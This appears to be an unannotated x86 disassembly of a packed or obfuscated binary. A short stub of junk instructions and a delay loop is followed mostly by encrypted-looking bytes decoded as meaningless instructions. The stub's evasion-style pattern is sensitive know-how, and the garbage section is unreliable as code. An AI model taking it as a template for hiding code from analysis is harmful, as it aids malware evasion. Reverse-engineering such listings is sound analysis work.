  401841:	daa    
  401842:	nop
  401843:	mov    esi,0x6dee9a34
  401848:	mov    eax,ds:0xe04589ae
  40184d:	neg    DWORD PTR ds:0x430516
  401853:	push   ebx
  401854:	lea    eax,[ebp-0x18]
  401857:	xor    DWORD PTR ds:0x42e7e2,ebx
  40185d:	mov    DWORD PTR [ebp-0x1c],eax
  401860:	mov    eax,DWORD PTR [ebp-0x1c]
  401863:	xor    ecx,0x76fe
  401869:	push   esi
  40186a:	sbb    ecx,ecx
  40186c:	push   edi
  40186d:	adc    DWORD PTR ds:0x4305c6,ebx
  401873:	mov    edi,0xf89f2dad
  401878:	mov    DWORD PTR [eax],edi
  40187a:	mov    DWORD PTR ds:0x4305c2,0x13
  401884:	cmp    DWORD PTR ds:0x4305c2,0x0
  40188b:	je     0x4018c5
  401891:	cmp    DWORD PTR ds:0x4305c2,0x21
  401898:	jne    0x4018a9
  40189e:	push   0x4555
  4018a3:	call   DWORD PTR ds:0x42eb24
  4018a9:	mov    ebx,DWORD PTR ds:0x4305c2
  4018af:	dec    ebx
  4018b0:	mov    DWORD PTR ds:0x4305c2,ebx
  4018b6:	jmp    0x401884
  4018bb:	add    DWORD PTR ds:0x42e7de,0x42e7e2
  4018c5:	mov    eax,DWORD PTR [ebp-0x14]
  4018c8:	or     ecx,0x5402
  4018ce:	mov    ebx,DWORD PTR [ebp-0x8]
  4018d1:	mov    ecx,0x7510856
  4018d6:	xor    eax,ecx
  4018d8:	mov    esi,0x32729d
  4018dd:	sbb    DWORD PTR ds:0x430532,0x704c
  4018e7:	xor    ebx,ecx
  4018e9:	xor    edx,edx
  4018eb:	xor    DWORD PTR ds:0x42e7ea,0x4305c2
  4018f5:	add    eax,esi
  4018f7:	add    ebx,esi
  4018f9:	sbb    DWORD PTR ds:0x4305d2,0x21a7
  401903:	jmp    0x401cb4
  401908:	ret    0xa9a5
  40190b:	imul   ebp,DWORD PTR [ecx+0x7b],0xffffffc4
  40190f:	mov    ebp,0x8064be64
  401914:	(bad)  
  401915:	jg     0x40195c
  401917:	pop    esi
  401918:	push   ss
  401919:	jne    0x401999
  40191b:	jle    0x40189f
  40191d:	jno    0x40199d
  40191f:	jle    0x401907
  401921:	fisttp WORD PTR [edi+0x1f]
  401924:	dec    ebp
  401925:	fidivr DWORD PTR [edx+0x4d]
  401928:	xor    esi,DWORD PTR [edx+0x68]
  40192b:	addr16 inc edi
  40192d:	repnz ror DWORD PTR cs:[ebx],1
  401931:	enter  0xf5c7,0x15
  401935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401936:	mov    ah,0x41
  401938:	and    eax,0x12fc489b
  40193d:	daa    
  40193e:	fcomp  st(2)
  401940:	push   esi
  401941:	leave  
  401942:	ret    
  401943:	out    0xd0,al
  401945:	pop    esi
  401946:	outs   dx,BYTE PTR ds:[esi]
  401947:	sub    al,BYTE PTR [esi+0x1a94a36a]
  40194d:	imul   esi,DWORD PTR [ebp+0x4e3f545a],0xffffff86
  401954:	and    eax,0x2a0292b6
  401959:	pop    es
  40195a:	push   ebx
  40195b:	test   BYTE PTR [ebp+0x920a8c8],ch
  401961:	mov    ah,0x6
  401963:	lahf   
  401964:	mov    ds:0xf0146136,eax
  401969:	jmp    0xd8db2b7c
  40196e:	das    
  40196f:	stos   DWORD PTR es:[edi],eax
  401970:	xchg   esp,eax
  401971:	cmp    BYTE PTR [ecx-0x67a2f899],dl
  401977:	stos   BYTE PTR es:[edi],al
  401978:	inc    ecx
  401979:	pop    edx
  40197a:	mov    ecx,0x960ab116
  40197f:	lock push edx
  401981:	in     eax,dx
  401982:	and    dl,al
  401984:	adc    BYTE PTR [ebp+0x736cf402],ch
  40198a:	adc    al,0x91
  40198c:	dec    eax
  40198d:	loop   0x4019bc
  40198f:	jnp    0x4019e8
  401991:	je     0x4019dd
  401993:	pop    esp
  401994:	push   ds
  401995:	ins    BYTE PTR es:[edi],dx
  401996:	push   es
  401997:	adc    al,0xdd
  401999:	pusha  
  40199a:	gs xchg esi,eax
  40199c:	mov    ebx,DWORD PTR [esp+edx*4]
  40199f:	add    ch,BYTE PTR [edx-0x35ac1edb]
  4019a5:	mov    edi,0x82508300
  4019aa:	jge    0x4019f9
  4019ac:	xor    al,0x43
  4019ae:	pop    ds
  4019af:	xlat   BYTE PTR ds:[ebx]
  4019b0:	mov    ah,0x2d
  4019b2:	push   ebx
  4019b3:	mov    edx,0xfa971e56
  4019b8:	inc    esi
  4019b9:	ror    DWORD PTR [ebx+0x30],0x1c
  4019bd:	mov    ecx,0x4d947d5
  4019c2:	mov    bh,0xfa
  4019c4:	shl    DWORD PTR [edx-0x162036d3],1
  4019ca:	out    dx,al
  4019cb:	imul   esp,DWORD PTR [ebx-0x2f],0xffffffa0
  4019cf:	rcl    cl,cl
  4019d1:	push   edi
  4019d2:	retf   0x893a
  4019d5:	repnz mov WORD PTR [ebx-0x58],es
  4019d9:	stos   BYTE PTR es:[edi],al
  4019da:	pop    ebx
  4019db:	retf   
  4019dc:	mov    bl,0x20
  4019de:	xchg   edx,eax
  4019df:	sbb    edi,esp
  4019e1:	add    edi,DWORD PTR [edi-0x207ce922]
  4019e7:	dec    ebp
  4019e8:	cld    
  4019e9:	mov    esi,eax
  4019eb:	cmp    DWORD PTR [ecx-0x7a2b78af],esp
  4019f1:	aas    
  4019f2:	sbb    al,0x26
  4019f4:	and    BYTE PTR [ebx],dl
  4019f6:	dec    eax
  4019f7:	xlat   BYTE PTR ds:[ebx]
  4019f8:	push   eax
  4019f9:	mov    bh,0xe1
  4019fb:	and    BYTE PTR [edx],ah
  4019fd:	out    dx,al
  4019fe:	jbe    0x4019e8
  401a00:	add    al,BYTE PTR [edx]
  401a02:	mov    cl,0xdb
  401a04:	dec    edi
  401a05:	outs   dx,BYTE PTR ds:[esi]
  401a06:	or     bh,BYTE PTR ds:0x9b0fcceb
  401a0c:	rcl    BYTE PTR [edx],0xae
  401a0f:	je     0x401a70
  401a11:	cmp    eax,0xcf8bb274
  401a16:	cmp    ch,BYTE PTR es:[ebx+edi*4-0x4a]
  401a1b:	pop    ss
  401a1c:	pop    ds
  401a1d:	xor    BYTE PTR [esi+0x5887203],0xb9
  401a24:	sar    DWORD PTR [edi+0x10dd5b07],cl
  401a2a:	xor    BYTE PTR [ecx-0x6e],al
  401a2d:	jge    0x401aa4
  401a2f:	rol    BYTE PTR [ebx],cl
  401a31:	mov    gs,WORD PTR [ecx-0x7e47afea]
  401a37:	ds sub al,ah
  401a3a:	push   ebp
  401a3b:	retf   0x3db0
  401a3e:	stos   BYTE PTR es:[edi],al
  401a3f:	and    eax,0xeb34e0e3
  401a44:	cmc    
  401a45:	inc    esp
  401a46:	jnp    0x401a45
  401a48:	inc    ebx
  401a49:	jae    0x401a5e
  401a4b:	test   BYTE PTR [edi],dh
  401a4d:	clc    
  401a4e:	add    eax,esp
  401a50:	ins    BYTE PTR es:[edi],dx
  401a51:	mov    bl,0x67
  401a53:	mov    ecx,0x18eb24e1
  401a58:	sub    ebx,0x3e4945d5
  401a5e:	xchg   ecx,esi
  401a60:	pop    ss
  401a61:	leave  
  401a62:	and    dh,dl
  401a64:	or     dl,bl
  401a66:	or     bh,BYTE PTR [esi-0x77]
  401a69:	xchg   ebp,eax
  401a6a:	scas   al,BYTE PTR es:[edi]
  401a6b:	inc    edx
  401a6c:	and    BYTE PTR [eax-0x2a],dl
  401a6f:	fidiv  DWORD PTR [edi]
  401a71:	xchg   edi,eax
  401a72:	rcr    BYTE PTR [esi],0xdc
  401a75:	cmp    bh,bl
  401a77:	call   0xb3d0:0xf67e9088
  401a7e:	adc    DWORD PTR [ebp-0x5c],0xffffff80
  401a82:	mov    al,ds:0x32708336
  401a87:	inc    edx
  401a88:	add    eax,0x448a79e2
  401a8d:	les    esp,FWORD PTR [ebp-0x34]
  401a90:	std    
  401a91:	xor    al,BYTE PTR [ebx+edx*4-0x6c0698b]
  401a98:	mov    ah,0x7
  401a9a:	push   ebx
  401a9b:	repnz sahf 
  401a9d:	scas   eax,DWORD PTR es:[edi]
  401a9e:	cmovae ebp,DWORD PTR [eax]
  401aa1:	xchg   esi,eax
  401aa2:	das    
  401aa3:	adc    eax,DWORD PTR [ebx+0x7b]
  401aa6:	mov    dl,0xb6
  401aa8:	icebp  
  401aa9:	sahf   
  401aaa:	loopne 0x401aeb
  401aac:	ins    DWORD PTR es:[edi],dx
  401aad:	(bad)  [edi]
  401aaf:	clc    
  401ab0:	jo     0x401a9a
  401ab2:	jl     0x401ad1
  401ab4:	add    BYTE PTR [ecx+0xb4709c6],cl
  401aba:	pop    eax
  401abb:	push   edi
  401abc:	sub    DWORD PTR [edi-0x70],ebp
  401abf:	jb     0x401add
  401ac1:	pop    ebx
  401ac2:	add    eax,0xdfbb046b
  401ac7:	pop    DWORD PTR [eax+0x3b7add8c]
  401acd:	pop    edx
  401ace:	jg     0x401b44
  401ad0:	addr16 pop ecx
  401ad2:	shl    edx,cl
  401ad4:	xchg   ebx,eax
  401ad5:	or     eax,0xba51f979
  401ada:	or     dl,BYTE PTR [ebx]
  401adc:	or     eax,0xcb046318
  401ae1:	cmp    eax,0xa2606740
  401ae6:	gs sbb al,0x5a
  401ae9:	inc    esi
  401aea:	stos   DWORD PTR es:[edi],eax
  401aeb:	xchg   BYTE PTR [esi-0x1f],bl
  401aee:	inc    DWORD PTR [esi]
  401af0:	mov    esi,0xf2a63dc4
  401af5:	push   cs
  401af6:	loopne 0x401ad7
  401af8:	sbb    BYTE PTR [eax],ah
  401afa:	mov    ebp,DWORD PTR [edi-0x635d4fd5]
  401b00:	lds    edx,FWORD PTR [esi+0x57292cb4]
  401b06:	sub    esi,edx
  401b08:	stos   DWORD PTR es:[edi],eax
  401b09:	cs dec esi
  401b0b:	js     0x401ac1
  401b0d:	rcl    cl,1
  401b0f:	jae    0x401b01
  401b11:	xchg   ebx,eax
  401b12:	lock mov DWORD PTR [ebx],ecx
  401b15:	loop   0x401b58
  401b17:	jge    0x401b66
  401b19:	test   al,0xcd
  401b1b:	and    al,0x69
  401b1d:	mov    cl,BYTE PTR [edx+0x44485c36]
  401b23:	pop    ebp
  401b24:	adc    eax,0x2cbe23f3
  401b29:	mov    al,ds:0xbd660548
  401b2e:	clc    
  401b2f:	sbb    ah,BYTE PTR [ebx+0xfcea003]
  401b35:	js     0x401acd
  401b37:	rcr    BYTE PTR [ecx-0x69b1ab63],1
  401b3d:	ret    
  401b3e:	ret    
  401b3f:	adc    DWORD PTR [ebp-0x69],ecx
  401b42:	mov    cl,0x4b
  401b44:	push   cs
  401b45:	add    DWORD PTR [eax],edi
  401b47:	push   ebp
  401b48:	inc    edx
  401b49:	add    eax,0xd36363a3
  401b4e:	or     DWORD PTR [esi],0x10
  401b51:	fwait
  401b52:	xchg   DWORD PTR [ebp-0x6483e1c2],edi
  401b58:	test   DWORD PTR [ecx-0x663fc204],esp
  401b5e:	mov    ah,BYTE PTR [eax]
  401b60:	or     bh,dh
  401b62:	jmp    0x401b51
  401b64:	mov    ?,WORD PTR [esi+0x38]
  401b67:	inc    ebx
  401b68:	and    BYTE PTR [edi+0x2],cl
  401b6b:	mov    eax,ds:0x270c9dac
  401b70:	mov    WORD PTR [esi],?
  401b72:	imul   DWORD PTR [eax-0x33]
  401b75:	(bad)  
  401b77:	cmp    esp,DWORD PTR [ebx]
  401b79:	sar    BYTE PTR [ebx+0x63],cl
  401b7c:	xchg   DWORD PTR [eax-0x2259d96b],eax
  401b82:	push   es
  401b83:	and    ebx,esp
  401b85:	mov    bl,0x9e
  401b87:	jae    0x401bd4
  401b89:	dec    esi
  401b8a:	enter  0xd8,0x2d
  401b8e:	or     ch,ch
  401b90:	les    esi,FWORD PTR [ebx]
  401b92:	pop    ebx
  401b93:	aaa    
  401b94:	fnstsw WORD PTR ss:[edx*2+0x2e72c7cb]
  401b9c:	ds enter 0x7d5,0x18
  401ba1:	fisttp QWORD PTR [edx-0x61]
  401ba4:	add    bh,BYTE PTR [edi+0x2b6a5f20]
  401baa:	xchg   ecx,eax
  401bab:	mov    dh,0x2c
  401bad:	jge    0x401bd4
  401baf:	mov    BYTE PTR [ecx+0x77750826],0xd1
  401bb6:	shl    BYTE PTR [ecx+ebp*2-0x7d5b73c6],cl
  401bbd:	dec    ebp
  401bbe:	mov    bh,0xed
  401bc0:	in     al,dx
  401bc1:	sti    
  401bc2:	mov    cl,0x38
  401bc5:	and    eax,0xed4b839a
  401bca:	push   es
  401bcb:	cs cli 
  401bcd:	cmp    BYTE PTR [ecx-0x326aa1f3],ah
  401bd3:	mov    eax,ds:0x2b0417f5
  401bd8:	jmp    0x401bf2
  401bda:	bound  eax,QWORD PTR [edx]
  401bdc:	ret    
  401bdd:	mov    bl,0x69
  401bdf:	or     BYTE PTR [ebx+esi*8+0x6560b8bb],ch
  401be6:	push   ds
  401be7:	add    ebx,DWORD PTR [edx-0x19]
  401bea:	ja     0x401b9d
  401bec:	or     BYTE PTR [eax+0x6],ch
  401bef:	rol    BYTE PTR [eax],0xc4
  401bf2:	and    bh,BYTE PTR [edx]
  401bf4:	ins    DWORD PTR es:[edi],dx
  401bf5:	cmp    dl,dh
  401bf7:	push   edi
  401bf8:	pop    ebx
  401bf9:	pop    es
  401bfa:	aad    0xfe
  401bfc:	sbb    BYTE PTR [edi],0xd9
  401bff:	sub    DWORD PTR [edx],ebx
  401c01:	rcl    ebx,0x6d
  401c04:	repz bound esi,QWORD PTR [ebp-0x703adbb1]
  401c0b:	pusha  
  401c0c:	xchg   ebx,eax
  401c0d:	(bad)  
  401c0e:	add    BYTE PTR ds:[esi+0x7fecf686],0x59
  401c16:	arpl   WORD PTR [edx+0x4d467642],cx
  401c1c:	or     al,BYTE PTR [ebx]
  401c1e:	mov    ?,WORD PTR [esi+ebp*1-0x2984c1b4]
  401c25:	lods   eax,DWORD PTR ds:[esi]
  401c26:	arpl   WORD PTR cs:[ecx],bx
  401c29:	add    eax,0x65989ac9
  401c2e:	arpl   WORD PTR [ebx],si
  401c30:	retf   
  401c31:	out    0x74,al
  401c33:	sub    edi,DWORD PTR [ebx+eiz*1-0x5f]
  401c37:	popf   
  401c38:	xor    ebx,edx
  401c3a:	jmp    0xc99d3bed
  401c3f:	xor    dh,BYTE PTR [ecx+0x12]
  401c42:	mov    ebx,esp
  401c44:	gs xchg ebp,eax
  401c46:	out    0x21,al
  401c48:	fwait
  401c49:	and    ah,BYTE PTR [edx]
  401c4b:	and    BYTE PTR [ebx],0xf6
  401c4e:	jns    0x401c50
  401c50:	xchg   ecx,ebp
  401c52:	jle    0x401c9a
  401c54:	and    dl,BYTE PTR [ebp-0x7e]
  401c57:	inc    edx
  401c58:	pop    esi
  401c59:	jno    0x401cae
  401c5b:	inc    edx
  401c5c:	cmc    
  401c5d:	mov    ah,0xf
  401c5f:	pushf  
  401c60:	mov    edi,esi
  401c62:	inc    eax
  401c63:	jg     0x401c28
  401c65:	add    eax,0x1ac32ef6
  401c6a:	gs sti 
  401c6c:	and    dl,ch
  401c6e:	imul   ebp,DWORD PTR [esi-0x429a2c53],0xffffffb6
  401c75:	hlt    
  401c76:	(bad)  
  401c77:	xor    DWORD PTR [eax],ebp
  401c79:	or     cl,BYTE PTR [edx+0x50ece63e]
  401c7f:	outs   dx,BYTE PTR ds:[esi]
  401c80:	xor    edx,DWORD PTR [esi]
  401c82:	imul   DWORD PTR [ecx]
  401c84:	stos   BYTE PTR es:[edi],al
  401c85:	sbb    al,0x6
  401c87:	test   ebp,ebp
  401c89:	je     0x401c60
  401c8b:	or     eax,0x57e06579
  401c90:	je     0x401cee
  401c92:	dec    eax
  401c93:	or     ebp,DWORD PTR [ebp+ecx*4-0x5d]
  401c97:	sbb    eax,0x8025644d
  401c9c:	add    bh,BYTE PTR [ebx-0x2b910136]
  401ca2:	pop    eax
  401ca3:	push   0xbbe018b2
  401ca8:	push   0x25
  401caa:	or     eax,DWORD PTR [eax]
  401cac:	scas   eax,DWORD PTR es:[edi]
  401cad:	shl    BYTE PTR [edi+0x38a64fb0],cl
  401cb3:	dec    edi
  401cb4:	div    ebx
  401cb6:	mov    DWORD PTR ds:0x42eea0,0x29
  401cc0:	jmp    0x402071
  401cc5:	pop    ds
  401cc6:	nop
  401cc7:	jl     0x401d20
  401cc9:	jge    0x401d46
  401ccb:	and    eax,0x749e668
  401cd0:	jns    0x401cb8
  401cd2:	in     al,0xa7
  401cd4:	(bad)  
  401cd5:	mov    edx,0x827e7e08
  401cda:	jno    0x401d5a
  401cdc:	jle    0x401c69
  401cde:	je     0x401c8c
  401ce0:	mov    ds:0xf21ab1f6,eax
  401ce5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ce6:	xor    al,0xd5
  401ce8:	pop    edx
  401ce9:	nop
  401cea:	adc    ebp,DWORD PTR [esi]
  401cec:	in     al,0x4b
  401cee:	(bad)  
  401cef:	jno    0x401ce1
  401cf1:	jmp    0x401d50
  401cf3:	js     0x401d07
  401cf5:	loopne 0x401c96
  401cf7:	pop    ebx
  401cf8:	or     al,0x60
  401cfa:	idiv   DWORD PTR [edx]
  401cfc:	mov    eax,ds:0x9ef6b34
  401d01:	and    bh,BYTE PTR [eax-0x6b]
  401d04:	(bad)  
  401d05:	jb     0x401cfe
  401d07:	shl    BYTE PTR es:[esi-0x22b38daa],0x2c
  401d0f:	cmp    ah,0x51
  401d12:	mov    al,ds:0x4bcf9d6
  401d17:	fcom   st(6)
  401d19:	jns    0x401d84
  401d1b:	sub    BYTE PTR [eax-0x72b6b694],0xd1
  401d22:	push   ss
  401d23:	xchg   ebp,eax
  401d24:	push   es
  401d25:	dec    ecx
  401d26:	popf   
  401d27:	gs mov bl,0xd9
  401d2a:	jno    0x401d0c
  401d2c:	loopne 0x401d33
  401d2e:	fmul   DWORD PTR [edx+0x25]
  401d31:	add    esp,esp
  401d33:	mov    edx,0x3eb4b4f5
  401d38:	dec    eax
  401d39:	cmp    DWORD PTR [ebp+0x7ce90251],ebp
  401d3f:	adc    BYTE PTR [ebx],ch
  401d41:	stc    
  401d42:	xchg   esp,eax
  401d43:	in     eax,dx
  401d44:	push   ebx
  401d45:	xor    BYTE PTR [ecx],bl
  401d47:	xor    eax,0xefa6fec3
  401d4c:	mov    ebx,DWORD PTR [esi-0x6e]
  401d4f:	push   ebx
  401d50:	lahf   
  401d51:	mov    bl,0xf8
  401d53:	dec    ebp
  401d54:	fild   WORD PTR [edx+0x54]
  401d57:	pop    edi
  401d58:	add    BYTE PTR [esp+edi*1],dh
  401d5b:	enter  0x7cc1,0x2
  401d5f:	push   ebp
  401d60:	popf   
  401d61:	jge    0x401d37
  401d63:	outs   dx,BYTE PTR ds:[esi]
  401d64:	dec    ebx
  401d65:	sub    al,0xde
  401d67:	cmp    bl,0x52
  401d6a:	mov    dh,0x54
  401d6c:	push   ss
  401d6d:	addr16 inc ecx
  401d6f:	mul    DWORD PTR [ebx-0x6a]
  401d72:	jno    0x401d95
  401d74:	scas   al,BYTE PTR es:[edi]
  401d75:	es int 0x10
  401d78:	add    BYTE PTR [ecx+0x5f],ah
  401d7b:	cwde   
  401d7c:	das    
  401d7d:	int    0xc1
  401d7f:	push   edx
  401d80:	add    ecx,ebx
  401d82:	mov    eax,ds:0xee013b85
  401d87:	out    dx,al
  401d88:	jp     0x401d72
  401d8a:	loop   0x401da2
  401d8c:	mov    dl,0x57
  401d8e:	fld    DWORD PTR [esi+0x3d0e3793]
  401d94:	bound  edi,QWORD PTR [ecx+0x5dfe24e7]
  401d9a:	cmp    BYTE PTR [edi-0xb9e02ec],cl
  401da0:	adc    DWORD PTR [eax+ecx*4+0x5e],ecx
  401da4:	hlt    
  401da5:	clc    
  401da6:	xchg   edx,eax
  401da7:	xor    al,0x7b
  401da9:	mov    edx,0xa40fe7a2
  401dae:	rcr    DWORD PTR [esi-0x64c80b6d],1
  401db4:	in     al,dx
  401db5:	icebp  
  401db6:	inc    eax
  401db7:	into   
  401db8:	or     eax,0xdf17470c
  401dbd:	test   DWORD PTR [ebp+ebx*8-0x3f],edi
  401dc1:	inc    esp
  401dc2:	rcr    BYTE PTR [ecx+0x2a678cfe],0xcb
  401dc9:	ret    0xc546
  401dcc:	inc    eax
  401dcd:	adc    DWORD PTR [ebx+0x75],edi
  401dd0:	dec    esi
  401dd1:	xchg   edx,eax
  401dd2:	dec    ecx
  401dd3:	and    cl,ah
  401dd5:	pop    edx
  401dd6:	pop    edx
  401dd7:	repz pop eax
  401dd9:	pop    edx
  401dda:	ficomp WORD PTR [ebx]
  401ddc:	xchg   ecx,eax
  401ddd:	mov    al,ds:0x6c4ec3bf
  401de2:	sbb    esi,DWORD PTR [ecx-0x2c]
  401de5:	xchg   ebp,eax
  401de6:	std    
  401de7:	sbb    BYTE PTR [edx-0x41],ah
  401dea:	int    0x3c
  401dec:	sub    BYTE PTR [esi-0x9],dh
  401def:	dec    ebp
  401df0:	dec    edx
  401df1:	sbb    DWORD PTR [edx],ebx
  401df3:	add    BYTE PTR [ebx],0x73
  401df6:	js     0x401dba
  401df8:	jne    0x401df3
  401dfa:	stc    
  401dfb:	ja     0x401e12
  401dfd:	fmul   QWORD PTR [edx]
  401dff:	mov    edx,0xaa6e6d99
  401e04:	in     al,0xed
  401e06:	xor    eax,0xbd493d4a
  401e0b:	adc    al,0xb8
  401e0d:	jg     0x401db6
  401e0f:	loope  0x401e81
  401e11:	dec    ecx
  401e12:	sub    DWORD PTR [ebp+0x1a861841],esi
  401e18:	test   eax,ecx
  401e1a:	adc    al,0x40
  401e1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e1d:	mov    eax,ds:0x773d540a
  401e22:	repz add BYTE PTR [ecx+0x716e3876],ch
  401e29:	scas   eax,DWORD PTR es:[edi]
  401e2a:	jmp    0x401e22
  401e2c:	ror    DWORD PTR [esp+esi*1+0x48cb98be],cl
  401e33:	cmp    eax,0xa7eed28f
  401e38:	fistp  DWORD PTR ds:0xb3859527
  401e3e:	and    DWORD PTR [eax],0x32
  401e41:	xor    ah,BYTE PTR [eax+0x5b]
  401e44:	hlt    
  401e45:	push   ecx
  401e46:	cmp    eax,0xc2665697
  401e4b:	mov    bl,0x31
  401e4d:	inc    edi
  401e4e:	push   edx
  401e4f:	or     esi,DWORD PTR [eax+edx*8-0x72]
  401e53:	rol    BYTE PTR [ecx-0x79d287bb],cl
  401e59:	call   0xe4b4:0x35df8766
  401e60:	test   ch,dh
  401e62:	stos   BYTE PTR es:[edi],al
  401e63:	and    esi,DWORD PTR [eax]
  401e65:	jecxz  0x401e37
  401e67:	popa   
  401e68:	fdivr  QWORD PTR [ebx]
  401e6a:	push   edx
  401e6b:	test   al,0xe1
  401e6d:	add    ebp,DWORD PTR ds:0x25d6f0b7
  401e73:	ret    
  401e74:	dec    ebx
  401e75:	xor    esp,DWORD PTR [edi+edx*4]
  401e78:	stos   DWORD PTR es:[edi],eax
  401e79:	xchg   edx,eax
  401e7a:	add    al,0x92
  401e7c:	and    bl,ah
  401e7e:	dec    ecx
  401e7f:	push   esi
  401e80:	adc    eax,0xd8f1c4f6
  401e85:	xchg   edi,eax
  401e86:	cld    
  401e87:	mov    WORD PTR [esi+0x63],?
  401e8a:	sbb    eax,0x2d8f337b
  401e8f:	sub    dh,ah
  401e91:	cmp    al,0x3
  401e93:	mov    edi,0x32aea5da
  401e98:	cmp    BYTE PTR [edi],ah
  401e9a:	mov    esi,0x2f57da4c
  401e9f:	mov    edx,0x97ef31c5
  401ea4:	mov    ah,0x3c
  401ea6:	(bad)  
  401ea8:	(bad)  
  401ea9:	adc    DWORD PTR [esi],esp
  401eab:	imul   edi,edx,0x20
  401eae:	pop    ebp
  401eaf:	xor    BYTE PTR [ebx-0x3],bl
  401eb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401eb3:	mov    al,ds:0xaa472179
  401eb8:	jne    0x401ecd
  401eba:	clc    
  401ebb:	inc    edi
  401ebc:	dec    eax
  401ebd:	pop    ebp
  401ebe:	out    dx,al
  401ebf:	in     eax,dx
  401ec0:	push   0x471f4dfa
  401ec5:	xchg   ebx,eax
  401ec6:	stos   BYTE PTR es:[edi],al
  401ec7:	cmp    ch,dl
  401ec9:	fidiv  WORD PTR [ebx+ebx*8-0xfe0a819]
  401ed0:	add    BYTE PTR [ebx*1-0x72cbcc1d],dh
  401ed7:	add    edi,eax
  401ed9:	les    edi,FWORD PTR [ebx+eax*4]
  401edc:	lock sbb bl,BYTE PTR [ebp-0x22a2ec4a]
  401ee3:	ror    eax,0x5
  401ee6:	popf   
  401ee7:	xchg   ch,bh
  401ee9:	add    DWORD PTR [ebx+0x54],0x5d
  401eed:	cmp    al,0x74
  401eef:	xchg   ebx,eax
  401ef0:	jmp    0xeba6:0xe417a068
  401ef7:	xchg   edi,esi
  401ef9:	sbb    eax,DWORD PTR [ebx-0x24]
  401efc:	fwait
  401efd:	pop    ss
  401efe:	stos   DWORD PTR es:[edi],eax
  401eff:	ja     0x401eb3
  401f01:	shl    ecx,1
  401f03:	lds    edi,FWORD PTR [edx-0x2d82a280]
  401f09:	fs rcr ecx,0x4
  401f0d:	outs   dx,DWORD PTR ds:[esi]
  401f0e:	lahf   
  401f0f:	adc    BYTE PTR [eax+0x3],dh
  401f12:	(bad)  
  401f13:	jae    0x401f6a
  401f15:	jge    0x401f35
  401f17:	(bad)  
  401f18:	sti    
  401f19:	inc    edx
  401f1a:	arpl   WORD PTR [edx-0x53cb86c5],ax
  401f20:	ins    BYTE PTR es:[edi],dx
  401f21:	sub    al,0xaf
  401f23:	iret   
  401f24:	add    ebp,DWORD PTR [ebx+0x20eb72e4]
  401f2a:	add    ch,bl
  401f2c:	loop   0x401f08
  401f2e:	inc    eax
  401f2f:	popa   
  401f30:	shr    DWORD PTR [edi+0x7b562e93],0x24
  401f37:	push   ss
  401f38:	addr16 lock push ds
  401f3b:	push   ecx
  401f3c:	pop    eax
  401f3d:	cmp    ecx,DWORD PTR [ecx]
  401f3f:	xchg   ecx,eax
  401f40:	push   esp
  401f41:	cmp    eax,ebp
  401f43:	sub    BYTE PTR [eax],ch
  401f45:	in     al,dx
  401f46:	sub    al,0x2b
  401f48:	outs   dx,BYTE PTR ds:[esi]
  401f49:	std    
  401f4a:	loopne 0x401f3d
  401f4c:	in     al,0x12
  401f4e:	aad    0x1c
  401f50:	or     dh,BYTE PTR [ecx+ebx*2-0x7e]
  401f54:	rol    bl,1
  401f56:	mov    ecx,0x378bd17f
  401f5b:	or     eax,0xf486def6
  401f60:	(bad)  
  401f61:	lahf   
  401f62:	pop    es
  401f63:	ja     0x401fa6
  401f65:	push   eax
  401f66:	jg     0x401f98
  401f68:	out    0xd0,al
  401f6a:	or     al,0x2e
  401f6c:	dec    ebp
  401f6d:	fistp  QWORD PTR [eax+0x1e6e4b1c]
  401f73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f74:	ret    
  401f75:	push   0xaec191b4
  401f7a:	loop   0x401ff4
  401f7c:	das    
  401f7d:	(bad)  [eax]
  401f7f:	shl    al,1
  401f81:	js     0x401fad
  401f83:	test   DWORD PTR [edi+0x234cac1e],ebp
  401f89:	add    dh,BYTE PTR [ecx]
  401f8b:	outs   dx,DWORD PTR ds:[esi]
  401f8c:	mov    esi,0xb736215f
  401f91:	pop    ss
  401f92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f93:	in     eax,0x20
  401f95:	shr    DWORD PTR [edi+0x73],0x2c
  401f99:	test   DWORD PTR [ebx+0x4d],0x83d0c951
  401fa0:	js     0x401f37
  401fa2:	push   ebp
  401fa3:	mov    ebp,0xa27be4f1
  401fa8:	mov    BYTE PTR [eax],dl
  401faa:	cmp    al,0xa7
  401fac:	into   
  401fad:	in     al,0xe4
  401faf:	stos   DWORD PTR es:[edi],eax
  401fb0:	stc    
  401fb1:	cmp    edi,DWORD PTR [ecx+0x6f]
  401fb4:	out    0x66,eax
  401fb6:	iret   
  401fb7:	fwait
  401fb8:	shr    BYTE PTR [esi+0x34],cl
  401fbb:	nop
  401fbc:	into   
  401fbd:	ins    DWORD PTR es:[edi],dx
  401fbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fbf:	rcl    DWORD PTR [esi+0x30412300],0xad
  401fc6:	xchg   BYTE PTR [ebp-0x86e5e98],dl
  401fcc:	jmp    0x40204d
  401fce:	cmp    BYTE PTR [ecx+0x4398456f],bl
  401fd4:	pop    ebx
  401fd5:	xchg   edx,eax
  401fd6:	and    DWORD PTR ds:[ebx+esi*2+0x1],eax
  401fdb:	dec    ebp
  401fdc:	jp     0x401fc2
  401fde:	dec    ebx
  401fdf:	hlt    
  401fe0:	push   ebx
  401fe1:	out    dx,al
  401fe2:	mov    ch,0xe5
  401fe4:	call   DWORD PTR [esi-0xb]
  401fe7:	dec    ecx
  401fe8:	scas   al,BYTE PTR es:[edi]
  401fe9:	and    eax,0xaea5548c
  401fee:	gs cmp al,0xe3
  401ff1:	sub    ch,BYTE PTR [ecx+0x6cf824a]
  401ff7:	cmp    BYTE PTR [ecx+0x70],0x35
  401ffb:	mov    al,ds:0x907e5d68
  402000:	jecxz  0x40201d
  402002:	ret    
  402003:	xchg   BYTE PTR ds:0xf61763af,bh
  402009:	pop    edx
  40200a:	aad    0x6d
  40200c:	jno    0x40207b
  40200e:	(bad)  
  40200f:	es dec esi
  402011:	pop    esp
  402012:	pop    ebp
  402013:	pop    esp
  402014:	mov    ebx,0xc036e061
  402019:	mov    ebx,0x9d7091be
  40201e:	jb     0x40205d
  402020:	adc    al,0x2d
  402022:	leave  
  402023:	pop    edx
  402024:	xor    ecx,DWORD PTR [edx+0x7]
  402027:	xchg   BYTE PTR [eax+0x49],al
